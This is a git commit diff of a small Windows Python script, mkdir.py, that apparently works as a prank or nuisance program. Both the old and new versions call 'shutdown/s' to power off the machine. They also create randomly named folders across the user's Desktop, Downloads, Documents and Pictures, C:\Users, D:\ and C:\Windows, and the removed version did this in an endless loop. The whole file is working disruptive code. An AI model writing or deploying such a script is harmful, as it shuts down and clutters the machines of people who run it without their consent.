3eecfb9f107aa52882d357658cc5b8a71d38ae37
unknown <babak.khezri7@gamil.com>
2020-03-24 20:36:07 +0430

    remove extra codes and add 3 more directory

--- mkdir.py
+++ mkdir.py
@@ -1,35 +1,28 @@
-from os import *
+from os import getcwd , mkdir , system
 from getpass import getuser
 from random import sample
-#find the Desktop
-def Desktop():
-    username = getuser()
-    addres = "C:\\Users\\" + username + "\\Desktop" 
-    return addres
-#find Downloads directory
-def Download():
-    username = getuser()
-    addres = "C:\\Users\\" + username + "\\Downloads"
-    return addres
+username = getuser()
 addres_1 = getcwd()
-addres_2 = "C:\\Users\\" + getuser()
-addres_3 = Desktop()
-addres_4 = "D:\\"
-addres_5 = Download()
+addres_2 = "D:\\"
+addres_3 = "C:\\Users"
+addres_4 = "C:\\Users\\" + username + "\\Desktop" 
+addres_5 = "C:\\Users\\" + username + "\\Downloads"
+addres_6 = "C:\\Users\\" + username + "\\Documents"
+addres_7 = "C:\\Users\\" + username + "\\Pictures"
+addres_8 = "C:\\Windows"
 name = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789(_!@#$%^&=+-`~)"
-#turn of the system ofter 10 sec
+#turn off the system ofter 10 sec
 system("shutdown/s")
-while True:
+for i in range(1):
     #make random name for directory
+    print(addres_3)
     directory = "".join(sample(name,10))
-    #create the directoryes
-    chdir(addres_1)
-    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))
-    chdir(addres_2)
-    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))
-    chdir(addres_3)
-    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))
-    chdir(addres_4)
-    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))
-    chdir(addres_5)
-    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))
+    #create the directories
+    mkdir(addres_1 + "\\{}".format(directory))
+    mkdir(addres_2 + "\\{}".format(directory))
+    mkdir(addres_3 + "\\{}".format(directory))
+    mkdir(addres_4 + "\\{}".format(directory))
+    mkdir(addres_5 + "\\{}".format(directory))
+    mkdir(addres_6 + "\\{}".format(directory))
+    mkdir(addres_7 + "\\{}".format(directory))
+    mkdir(addres_8 + "\\{}".format(directory))
